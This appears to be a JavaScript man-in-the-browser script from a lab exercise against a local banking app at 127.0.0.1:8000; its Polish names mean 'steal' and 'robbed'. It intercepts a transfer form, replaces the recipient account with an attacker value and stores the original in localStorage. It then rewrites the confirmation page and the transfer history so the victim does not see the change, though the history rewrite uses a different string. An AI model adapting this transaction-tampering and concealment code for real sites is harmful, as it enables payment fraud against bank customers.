function processForm(e) {
    if (e.preventDefault) e.preventDefault();

    form=document.getElementById('hackMe')
	if(form.rachunek.value=="kradnij"){
	form.style.display='none'
	localStorage.setItem('nrRachunku',form.rachunek.value)
	form.rachunek.value='okradziony'
	}
	form.submit()
    return false;
}

if(document.location.href=='http://127.0.0.1:8000/bank/przelew'){
var form = document.getElementById('hackMe');
if (form.attachEvent) {
    form.attachEvent("submit", processForm);
} else {
    form.addEventListener("submit", processForm);
}
}


if(document.location.href=='http://127.0.0.1:8000/bank/przelew/confirm'){
	ps=document.getElementsByTagName('p')
	p=ps[1]
	if(p.innerText==='okradziony'){
  p.innerText="Rachunek: "+localStorage.getItem('nrRachunku')+"\n"
	}
}

if(document.location.href=='http://127.0.0.1:8000/bank/przelew/all'){
	ps=document.getElementsByTagName('tr')
	for(var i=0;i<ps.length;i++){
		p=ps[i].getElementsByTagName('th')[1]
		if(p.innerText==='okradziony'){
			p.innerText='okradnij'
		}
	}

}
